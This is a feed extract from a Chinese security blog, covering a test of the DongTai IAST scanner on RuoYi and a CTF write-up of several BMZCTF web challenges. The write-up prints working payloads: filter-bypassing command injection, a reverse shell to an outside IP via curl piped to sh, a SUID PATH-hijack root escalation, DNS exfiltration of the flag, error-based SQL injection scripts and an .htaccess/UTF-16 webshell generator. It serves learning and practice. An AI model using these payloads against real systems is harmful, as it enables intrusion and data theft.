    <content type="html"><![CDATA[<h3 id="安装"><a href="#安装" class="headerlink" title="安装"></a>安装</h3><p>按照官方文档，<a href="https://doc.dongtai.io/02_start/index.html">https://doc.dongtai.io/02_start/index.html</a></p><p>使用docker来安装，直接执行</p><pre class="line-numbers language-none"><code class="language-none">git clone https:&#x2F;&#x2F;github.com&#x2F;HXSecurity&#x2F;DongTai.gitcd deploy&#x2F;docker-compose&#x2F;.&#x2F;dtctl install -v 1.1.2<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>不过这个创建docker有一个问题就是，openapi的端口没有被开启，修改dtctl，给openapi添加端口。这个端口的开启在1.0.5中，需要自己去填写openapi。</p><pre class="line-numbers language-none"><code class="language-none">dongtai-openapi:    image: &quot;dongtai.docker.scarf.sh&#x2F;dongtai&#x2F;dongtai-openapi:$CHANGE_THIS_VERSION&quot;    restart: always    ports:       - &quot;8000:8000&quot;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115139.png" alt="image-20211208141900279"></p><p>使用账号密码admin&#x2F;admin登陆，查看状态监控，基本就是如下显示</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115140.png" alt="image-20211208155958875"></p><h3 id="初测试"><a href="#初测试" class="headerlink" title="初测试"></a>初测试</h3><p>下载agent，此处使用IDEA来配置，在启动参数中添加，此处使用一个Spring的项目Ruoyi4.6版本。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115141.png" alt="image-20211208160954655"></p><p>洞态这边会显示一个agent：</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115142.png" alt="image-20211208161019830"></p><p>我们在ruoyi的后台点点点</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115143.png" alt="image-20211208161723992"></p><p>在洞态那边可以看到已经有一堆数据过来了</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115144.png" alt="image-20211208161757676"></p><p>旁边还存在依赖检测</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115145.png" alt="image-20211208162407807"></p><p>只不过这个检测注入有点问题，比如上面检测到pageSize存在问题，我们跟随调试一下。进行到如下代码，此处意思是获取参数名。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115146.png" alt="image-20211208172131061"></p><p>这里获取参数中排序的参数值此处是传输的asc</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115147.png" alt="image-20211208172203836"></p><p>下面的getPageSize是获取参数PageSize，但是这个函数返回类型是Integer。所以当传输一些字符返回的是null。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115148.png" alt="image-20211208172329146"></p><p>num和size不为null的时候，这里getOrderBy把参数orderByColumn和isAsc进行了拼接，escapeOrderBySql把参数值进行了一次判断，正则匹配字母数字和下划线，逗号，点。如果想靠这两个参数拼接也不行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115149.png" alt="image-20211208183537516"></p><p>这个版本存在一个注入，而这个注入跟这个参数其实没啥关系，ruoyi使用了mybatis，上面这个功能点确实是存在问题，查看sql的目录文件SysRoleMapper.xml。</p><p>找到id为selectRoleList，下面就可以看到了，其实是用了$来传参。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115151.png" alt="image-20211208183920487"></p><p>但是这个参数并不能直接利用，因为这个参数不在上面这个请求里。需要手动添加一下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/202112091115152.png" alt="image-20211208184326669"></p><p>这个功能上确实是存在注入问题，但是检测没有找准参数，这个点也许是由于这个参数不存在的原因，导致检测存在一些偏差。</p>]]></content>
    
    <summary type="html">
    
      
      
        &lt;h3 id=&quot;安装&quot;&gt;&lt;a href=&quot;#安装&quot; class=&quot;headerlink&quot; title=&quot;安装&quot;&gt;&lt;/a&gt;安装&lt;/h3&gt;&lt;p&gt;按照官方文档，&lt;a href=&quot;https://doc.dongtai.io/02_start/index.html&quot;&gt;https://do
      
    
    </summary>
    
    
      <category term="web安全" scheme="https://misakikata.github.io/tags/web%E5%AE%89%E5%85%A8/"/>
    
  </entry>
  
  <entry>
    <title>BMZCTF做题记录</title>
    <link href="https://misakikata.github.io/2021/10/BMZCTF%E5%81%9A%E9%A2%98%E8%AE%B0%E5%BD%95/"/>
    <id>https://misakikata.github.io/2021/10/BMZCTF做题记录/</id>
    <published>2021-10-19T03:00:14.000Z</published>
    <updated>2021-10-19T03:02:35.000Z</updated>
    
    <content type="html"><![CDATA[<h2 id="端午就该吃粽子"><a href="#端午就该吃粽子" class="headerlink" title="端午就该吃粽子"></a>端午就该吃粽子</h2><p>访问login.php，会给一个这样的链接<a href="http://www.bmzclub.cn:22937/login.php?zhongzi=show.php">http://www.bmzclub.cn:22937/login.php?zhongzi=show.php</a></p><p>看样子是文件读取的漏洞，尝试读取一个passwd文件。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922170259145.png" alt="image-20210922170259145"></p><p>可以直接读取，再去试试根目录下的flag文件，提示你是偷粽子的。从匹配上看是只要存在flag这个词就不行。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922170335891.png" alt="image-20210922170335891"></p><p>尝试利用远程包含，屏蔽了http关键词。file没有屏蔽，但是不能读取flag。那就尝试一下伪协议。</p><p>php:&#x2F;&#x2F;input不给用，都会报错。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922171943816.png" alt="image-20210922171943816"></p><p>尝试读取的命令php:&#x2F;&#x2F;filter</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;show.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922172127683.png" alt="image-20210922172127683"></p><p>解编码后发现是页面的HTML源码。里面注释了index.php。读取发现是如下php代码</p><pre class="line-numbers language-none"><code class="language-none">php:&#x2F;&#x2F;filter&#x2F;convert.base64-encode&#x2F;resource&#x3D;.&#x2F;index.php<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922172304376.png" alt="image-20210922172304376"></p><pre class="line-numbers language-none"><code class="language-none">&lt;?phperror_reporting(0);if (isset($_GET[&#39;url&#39;])) &#123;  $ip&#x3D;$_GET[&#39;url&#39;];  if(preg_match(&quot;&#x2F;(;|&#39;| |&gt;|]|&amp;| |python|sh|nc|tac|rev|more|tailf|index|php|head|nl|sort|less|cat|ruby|perl|bash|rm|cp|mv|\*)&#x2F;i&quot;, $ip))&#123;      die(&quot;&lt;script language&#x3D;&#39;javascript&#39; type&#x3D;&#39;text&#x2F;javascript&#39;&gt;      alert(&#39;no no no!&#39;)      window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);  &#125;else if(preg_match(&quot;&#x2F;.*f.*l.*a.*g.*&#x2F;&quot;, $ip))&#123;      die(&quot;&lt;script language&#x3D;&#39;javascript&#39; type&#x3D;&#39;text&#x2F;javascript&#39;&gt;      alert(&#39;no flag!&#39;)      window.location.href&#x3D;&#39;index.php&#39;;&lt;&#x2F;script&gt;&quot;);  &#125;  $a &#x3D; shell_exec(&quot;ping -c 4 &quot;.$ip);  echo $a;&#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>其中可以看到的是，基本过滤了文件读取的命令和常见反弹shell的方式，然后还不准同时出现flag这四个字符。</p><p>上面过滤的命令中，恰好有一个tail没有过滤，也就是使用这个来读取flag。</p><p>尝试先执行个命令看看</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922173502404.png" alt="image-20210922173502404"></p><p>然后tail去读文件，但是空格被禁用了，fuzz一下发现可以使用%09，但是还有flag不能用。这个可以使用通配符来绕过读取，最后就是</p><pre class="line-numbers language-none"><code class="language-none">index.php?url&#x3D;127.0.0.1||tail%09&#x2F;fla?<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210922173801969.png" alt="image-20210922173801969"></p><h2 id="hitcon-2017-ssrfme"><a href="#hitcon-2017-ssrfme" class="headerlink" title="hitcon_2017_ssrfme"></a>hitcon_2017_ssrfme</h2><p>访问给出的地址，首页是一段PHP代码</p><pre class="line-numbers language-none"><code class="language-none">&lt;?php     $sandbox &#x3D; &quot;sandbox&#x2F;&quot; . md5(&quot;orange&quot; . $_SERVER[&quot;REMOTE_ADDR&quot;]);     @mkdir($sandbox);     @chdir($sandbox); ​    $data &#x3D; shell_exec(&quot;GET &quot; . escapeshellarg($_GET[&quot;url&quot;]));     $info &#x3D; pathinfo($_GET[&quot;filename&quot;]);     $dir  &#x3D; str_replace(&quot;.&quot;, &quot;&quot;, basename($info[&quot;dirname&quot;]));     @mkdir($dir);     @chdir($dir);     @file_put_contents(basename($info[&quot;basename&quot;]), $data);     highlight_file(__FILE__);<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>看代码是使用IP地址来生成一个目录，这个目录我们可以根据自己的出口IP来确认，然后使用shell_exec来执行命令。使用传入的文件名参数进行创建目录，如果存在目录则去掉点，应该是防止目标遍历，最后生成文件名的文件，写入shell_exec执行的结果。</p><p>一开始还以为是需要执行命令来看，先来看看大概的执行结果，发现写入的是首页。才想起来这是个SSRF的题。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;http:&#x2F;&#x2F;127.0.0.1&amp;filename&#x3D;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>尝试利用file协议来读取flag</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?url&#x3D;file:&#x2F;&#x2F;&#x2F;flag&amp;filename&#x3D;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>利用orange和IP生成md5，到指定目录下查看文件</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;sandbox&#x2F;8c2xxx9c5&#x2F;123.123<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924101620908.png" alt="image-20210924101620908"></p><h2 id="n1ctf-x2F-hard-php"><a href="#n1ctf-x2F-hard-php" class="headerlink" title="n1ctf&#x2F;hard_php"></a>n1ctf&#x2F;hard_php</h2><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141002836.png" alt="image-20210924141002836"></p><p>一个登陆页面，按照惯例查看是否使用是文件包含读取，修改login为index，发现有登陆验证跳转，修改为</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;index.php?action&#x3D;..&#x2F;..&#x2F;..&#x2F;etc&#x2F;passwd<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141101145.png" alt="image-20210924141101145"></p><p>尝试去读取flag</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924141120638.png" alt="image-20210924141120638"></p><h2 id="WEB-penetration"><a href="#WEB-penetration" class="headerlink" title="WEB_penetration"></a>WEB_penetration</h2><p>这个题目稍微有点奇怪，一直在报错，不确定是不是程序问题。代码为：</p><pre class="line-numbers language-none"><code class="language-none">&lt;?phphighlight_file(__FILE__);if(isset($_GET[&#39;ip&#39;]))&#123;    $ip &#x3D; $_GET[&#39;ip&#39;];    $_&#x3D;array(&#39;b&#39;,&#39;d&#39;,&#39;e&#39;,&#39;-&#39;,&#39;q&#39;,&#39;f&#39;,&#39;g&#39;,&#39;i&#39;,&#39;p&#39;,&#39;j&#39;,&#39;+&#39;,&#39;k&#39;,&#39;m&#39;,&#39;n&#39;,&#39;\&lt;&#39;,&#39;\&gt;&#39;,&#39;o&#39;,&#39;w&#39;,&#39;x&#39;,&#39;\~&#39;,&#39;\:&#39;,&#39;\^&#39;,&#39;\@&#39;,&#39;\&amp;&#39;,&#39;\&#39;&#39;,&#39;\%&#39;,&#39;\&quot;&#39;,&#39;\*&#39;,&#39;\(&#39;,&#39;\)&#39;,&#39;\!&#39;,&#39;\&#x3D;&#39;,&#39;\.&#39;,&#39;\[&#39;,&#39;\]&#39;,&#39;\&#125;&#39;,&#39;\&#123;&#39;,&#39;\_&#39;);    $blacklist &#x3D; array_merge($_);    foreach ($blacklist as $blacklisted) &#123;        if (strlen($ip) &lt;&#x3D; 18)&#123;            if (preg_match (&#39;&#x2F;&#39; . $blacklisted . &#39;&#x2F;im&#39;, $ip)) &#123;                die(&#39;nonono&#39;);            &#125;else&#123;            exec($ip);            &#125;                    &#125;        else&#123;        die(&quot;long&quot;);        &#125;    &#125;    &#125;?&gt;<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>这个代码看起来是屏蔽了很多关键词，实际上是一个词匹配去查一次，也就是总共进行很多次匹配，有一次符合最后则返回nonono。那么也就是只需要第一次绕过这个过滤就算后面匹配到，命令依然执行了，所以限制只有长度不超过十八即可。但是结果并不会显示，所以我们需要进行一定的外带的办法。</p><pre class="line-numbers language-none"><code class="language-none">&#x2F;?ip&#x3D;ls+&#x2F;&gt;1.txt<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924152835470.png" alt="image-20210924152835470"></p><p>flag并不在根目录，查看其他目录。没有发现其他可读目录下存在，那可能在root目录，需要一定的提权方式，这种读写的办法就不太适用了。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924154101831.png" alt="image-20210924154101831"></p><p>想办法反弹一个shell出来，由于长度限制，此处不直接使用IP，转为十进制IP。利用如下</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n51" mdtype="fences">/?ip=curl+1093xxx907|sh<br><br>web服务使用flask搭建，写一个简单的返回。<br>@app.route(&#39;/&#39;)<br>def hello_world():<br>    return &#39;bash -c &#34;bash -i &gt;&amp; /dev/tcp/65.49.209.99/8888 0&gt;&amp;1&#34;&#39;</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924155033081.png" alt="image-20210924155033081"></p><p>查找有没有可用的SUID</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n54" mdtype="fences">find / -perm -u=s -type f 2&gt;/dev/null</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924155231086.png" alt="image-20210924155231086"></p><p>其中有一个奇怪的love程序，执行后类似是PS的查看进程的结果。所以可能需要劫持PS命令来提取。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n57" mdtype="fences">cd /tmp<br>echo &#34;/bin/bash&#34; &gt; ps<br>chmod 777 ps<br>echo $PATH<br>export PATH=/tmp:$PATH</pre><p>再去执行love，即可调用当前tmp目录下的ps命令，获取到一个root的shell。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210924160909016.png" alt="image-20210924160909016"></p><p>其中demo.c应该就是love的源代码</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n61" mdtype="fences"># cat demo.c<br><br>#include&lt;unistd.h&gt;<br>void main()<br>{<br>        setuid(0);<br>        setgid(0);<br>        system(&#34;ps&#34;);<br>}</pre><h2 id="流量监控平台"><a href="#流量监控平台" class="headerlink" title="流量监控平台"></a>流量监控平台</h2><p>WEb界面需要登陆，账号admin&#x2F;123456登陆。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100053004.png" alt="image-20210926100053004"></p><p>可以执行命令，看样子是绕过命令执行。由于不回显，所以使用DNS外带的方式。先测试一下可能使用的命令，发现常用的命令不能使用，比如ping,curl等会报错，采用单引号分隔绕过黑名单。还在报错，测试发现是拦截了空格。使用%09绕过。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n66" mdtype="fences">ord=ls;pi&#39;&#39;ng%09byvdxx.dnslog.cn</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100226721.png" alt="image-20210926100226721"></p><p>发现可行，然后使用ceye的监听平台</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n69" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`whoami`.xxxxb4.ceye.io</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100350410.png" alt="image-20210926100350410"></p><p>查看flag</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n72" mdtype="fences">ord=ls;pi&#39;&#39;ng%09`cat%09/flag`.r9rub4.ceye.io</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926100456158.png" alt="image-20210926100456158"></p><h2 id="rctf2015-easysql"><a href="#rctf2015-easysql" class="headerlink" title="rctf2015_easysql"></a>rctf2015_easysql</h2><p>打开是一个注册登陆页面，需要先注册个账号登陆，里面就是一些有的没得功能，还有一个修改密码。既然是注入，那就先把注册登陆看看有没有注入点，但是在注册的时候有过滤。</p><p>按照惯例，可能是二次注入，注册一个存在问题的用户名，然后在后续调用的时候触发注入，后续调用明显就是修改密码，这里只传输密码，那可能就是从session获取用户名。先去看看怎么构造能报错啥的。</p><p>从过滤上看and,or,空格等都被过滤掉了。有几个是注册成功的先去查看一下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926161421706.png" alt="image-20210926161421706"></p><p>登陆<code>admin%22%2f%2a</code>的时候，去修改密码功能，发现报错</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926161510472.png" alt="image-20210926161510472"></p><p>从报错上看SQL语句大概是</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n82" mdtype="fences">update user set pwd=&#34;xxxx&#34; where username=&#34;admin&#34;/*&#34; and pwd=&#39;698d51a19d8a121ce581499d7b701668&#39;;</pre><p>构造一个报错语句</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n84" mdtype="fences">username=1&#34;and (updatexml(1,concat(0x7e,(select user()),0x7e),1))#</pre><p>但是上面这个语句并不能使用，其中有空格和and符，修改为如下：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n86" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0buser()),0x7e),1))#</pre><p>登陆再去修改密码，发现可以正常执行，那就查库查表查字段一条龙服务。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926162235294.png" alt="image-20210926162235294"></p><p>当前库web_sqli</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n90" mdtype="fences">username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0bdatabase()),0x7e),1))#</pre><p>查看库内的表，正好第一次就是flag表</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n92" mdtype="fences">username=1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(table_name),0x7e)%0bfrom%0binformation_schema.tables%0bwhere%0btable_schema=&#39;web_sqli&#39;%0blimit%0b1,1),1))#</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926163153625.png" alt="image-20210926163153625"></p><p>查看字段，就存在一个flag字段</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n95" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;flag&#39;%0blimit%0b0,1),1))#</pre><p>查看字段值，显示<code>RCTF&#123;Good job! But flag not her</code>，啊这。。。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n97" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,flag,0x7e)from%0bflag%0blimit%0b0,1)%0b,1))#</pre><p>懂了，那个flag表是骗人的。再查询一遍还有article表和users表，用users表来查找。终于在字段中查到一个<code>real_flag_1s_here</code></p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n99" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(column_name),0x7e)%0bfrom%0binformation_schema.columns%0bwhere%0btable_name=&#39;users&#39;%0blimit%0b3,1),1))#</pre><p>再来查看字段值，limit查看都是一个个xxx，直接聚合输出</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n101" mdtype="fences">1&#34;%26%26(updatexml(1,(select%0bconcat(0x7e,(select%0bgroup_concat(real_flag_1s_here)from%0busers),0x7e))%0b,1))#</pre><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210926165906689.png" alt="image-20210926165906689"></p><p>啊这。。。好家伙，不够长的。。。那就还是一个个输出，先用Intruder批量注册。然后用下面的脚本查看。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n104" mdtype="fences">#coding:utf-8<br><br>import requests<br>import re<br><br>headers = {<br>&#39;Content-Type&#39;: &#39;application/x-www-form-urlencoded&#39;,<br>&#39;User-Agent&#39;: &#39;Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.159 Safari/537.36&#39;,<br>&#39;Accept&#39;: &#39;text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9&#39;,<br>&#39;Referer&#39;: &#39;http://www.bmzclub.cn:22937/changepwd.php&#39;,<br>&#39;Accept-Encoding&#39;: &#39;gzip, deflate&#39;,<br>&#39;Accept-Language&#39;: &#39;zh-CN,zh;q=0.9,en;q=0.8&#39;,<br>&#39;Cookie&#39;: &#39;Hm_lvt_d7a3b863d5a302676afbe86b11339abd=1631932461,1632274696,1632620435; session=5424329c-1b2e-4349-b4e1-0d2f55c408c5; PHPSESSID=1h1clgvbkvn31qbng29c0m8mr6; Hm_lpvt_d7a3b863d5a302676afbe86b11339abd=1632637433; td_cookie=468906102&#39;<br>}<br><br>for i in range(1, 21):<br>data = &#39;username=1&#34;%26%26(updatexml(1,concat(0x7e,(select%0breal_flag_1s_here%0bfrom%0busers%0blimit%0b{id},1),0x7e),1))#&amp;password=111&#39;.format(id=str(i))<br>r = requests.post(&#39;http://www.bmzclub.cn:22937/login.php&#39;, headers=headers, data=data)<br><br>r = requests.post(&#39;http://www.bmzclub.cn:22937/changepwd.php&#39;, headers=headers, data=&#34;oldpass=111&amp;newpass=111&#34;)<br>print(re.findall(&#39;XPATH syntax error: (.*)&#39;, r.text))<br></pre><p>结果全是<code>xxx</code>，啊这，给孩子整不会了。这难道就是0 Solver的原因？</p><h2 id="TCTF2019-Wallbreaker-Easy"><a href="#TCTF2019-Wallbreaker-Easy" class="headerlink" title="TCTF2019_Wallbreaker_Easy"></a>TCTF2019_Wallbreaker_Easy</h2><p>提示如下</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105315721.png" alt="image-20210927105315721"></p><p>蚁剑连接页面，这个是需要绕过disable_functions，phpinfo里紧了一堆函数</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105350495.png" alt="image-20210927105350495"></p><p>既然是7.2的PHP，那就蚁剑php7-backtrace-bypass一把嗖。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/image-20210927105430695.png" alt="image-20210927105430695"></p><h2 id="insomniteaser-2019-l33t-hoster"><a href="#insomniteaser-2019-l33t-hoster" class="headerlink" title="insomniteaser_2019_l33t_hoster"></a>insomniteaser_2019_l33t_hoster</h2><p>此问题并没有正确解出，本来使用大小写后缀外加图片马来绕过限制，但是发现并不会当作php执行。所以此处使用WP复现</p><p>首先是代码</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n116" mdtype="fences">$disallowed_ext = array(<br>    &#34;php&#34;,<br>    &#34;php3&#34;,<br>    &#34;php4&#34;,<br>    &#34;php5&#34;,<br>    &#34;php7&#34;,<br>    &#34;pht&#34;,<br>    &#34;phtm&#34;,<br>    &#34;phtml&#34;,<br>    &#34;phar&#34;,<br>    &#34;phps&#34;,<br>);<br><br><br>if (isset($_POST[&#34;upload&#34;])) {<br>    if ($_FILES[&#39;image&#39;][&#39;error&#39;] !== UPLOAD_ERR_OK) {<br>        die(&#34;yuuuge fail&#34;);<br>    }<br><br>    $tmp_name = $_FILES[&#34;image&#34;][&#34;tmp_name&#34;];<br>    $name = $_FILES[&#34;image&#34;][&#34;name&#34;];<br>    $parts = explode(&#34;.&#34;, $name);<br>    $ext = array_pop($parts);<br><br>    if (empty($parts[0])) {<br>        array_shift($parts);<br>    }<br><br>    if (count($parts) === 0) {<br>        die(&#34;lol filename is empty&#34;);<br>    }<br><br>    if (in_array($ext, $disallowed_ext, TRUE)) {<br>        die(&#34;lol nice try, but im not stupid dude...&#34;);<br>    }<br><br>    $image = file_get_contents($tmp_name);<br>    if (mb_strpos($image, &#34;&lt;?&#34;) !== FALSE) {<br>        die(&#34;why would you need php in a pic.....&#34;);<br>    }<br><br>    if (!exif_imagetype($tmp_name)) {<br>        die(&#34;not an image.&#34;);<br>    }<br><br>    $image_size = getimagesize($tmp_name);<br>    if ($image_size[0] !== 1337 || $image_size[1] !== 1337) {<br>        die(&#34;lol noob, your pic is not l33t enough&#34;);<br>    }<br><br>    $name = implode(&#34;.&#34;, $parts);<br>    move_uploaded_file($tmp_name, $userdir . $name . &#34;.&#34; . $ext);<br>}</pre><p>黑名单限制文件后缀，本来看到in_array中带了true，还以为是大小写绕过。实际是使用htaccess文件来定义文件解析类型。</p><p>上传.htaccess文件。此处由于会对文件名做处理，所以需要使用..htaccess文件来绕过执行，使得能正确保存文件。</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n119" mdtype="fences">$parts = explode(&#34;.&#34;, $name);    #Array([0] =&gt;  [1] =&gt;  [2] =&gt; htaccess)<br>    $ext = array_pop($parts);        #htaccess<br><br>    if (empty($parts[0])) {          #true<br>        array_shift($parts);          #返回删除的&#39;&#39;，还剩$parts[1] =&gt; &#39;&#39;<br>    }<br><br>    if (count($parts) === 0) {        #false  count=1<br>        die(&#34;lol filename is empty&#34;);<br>    }<br>    .....<br>    $name = implode(&#34;.&#34;, $parts);     #返回空，所以后续拼接的时候就是$userdir . &#34;.&#34; . $ext<br></pre><p>剩下的就是图片大小的问题，WP采用的图片格式为XBM格式，一种纯文本二进制图像格式，用于存储X GUI中使用的光标和图标位图。</p><p>前两个#defines指定位图的高度和宽度（以像素为单位），比如以下xbm文件：</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n122" mdtype="fences">#define test_width 16<br>#define test_height 7<br>static char test_bits[] = {<br>0x13, 0x00, 0x15, 0x00, 0x93, 0xcd, 0x55, 0xa5, 0x93, 0xc5, 0x00, 0x80,<br>0x00, 0x60 };</pre><p>后续就是绕过<code>&lt;?</code>这种过滤，WP解释由于使用PHP7.2，所以<code>&lt;script&gt;</code>指定语言的方式不能使用，这个没看出来PHP的版本。采用UTF-16大端编码格式，用一张图表示,utf-8一个字符一个字节，现在utf-16是两个字节编码一个字符。</p><p><img src="https://github-1300513062.cos.ap-shanghai.myqcloud.com/img/1063309-20190718173949769-1098882942.png"></p><p>所以利用如下脚本生成</p><pre class="md-fences mock-cm md-end-block" spellcheck="false" lang cid="n126" mdtype="fences">#!/usr/bin/python3<br><br>SIZE_HEADER = b&#34;\n\n#define width 1337\n#define height 1337\n\n&#34;<br><br>def generate_php_file(filename, script):<br>    phpfile = open(filename, &#39;wb&#39;) <br><br>    phpfile.write(script.encode(&#39;utf-16be&#39;))<br>    phpfile.write(SIZE_HEADER)<br><br>    phpfile.close()<br><br>def generate_htacess():<br>    htaccess = open(&#39;..htaccess&#39;, &#39;wb&#39;)<br>    htaccess.write(SIZE_HEADER)<br>    htaccess.write(b&#39;AddType application/x-httpd-php .php16\n&#39;)<br>    htaccess.write(b&#39;php_value zend.multibyte 1\n&#39;)<br>    htaccess.write(b&#39;php_value zend.detect_unicode 1\n&#39;)<br>    htaccess.write(b&#39;php_value display_errors 1\n&#39;)<br>    htaccess.close()<br>        <br>generate_htacess()<br><br>generate_php_file(&#34;webshell.php16&#34;, &#34;&lt;?php system($_GET[&#39;cmd&#39;]);?&gt;&#34;)<br>generate_php_file(&#34;scandir.php16&#34;, &#34;&lt;?php echo implode(&#39;\n&#39;, scandir($_GET[&#39;dir&#39;]));?&gt;&#34;)</pre><p>由于设置了diable，所以不能执行命令，如果需要考虑绕过的形式，可以利用蚁剑来直接执行。或者利用文件读取的shell。直接读取flag。</p><h2 id="2018网鼎杯Comment"><a href="#2018网鼎杯Comment" class="headerlink" 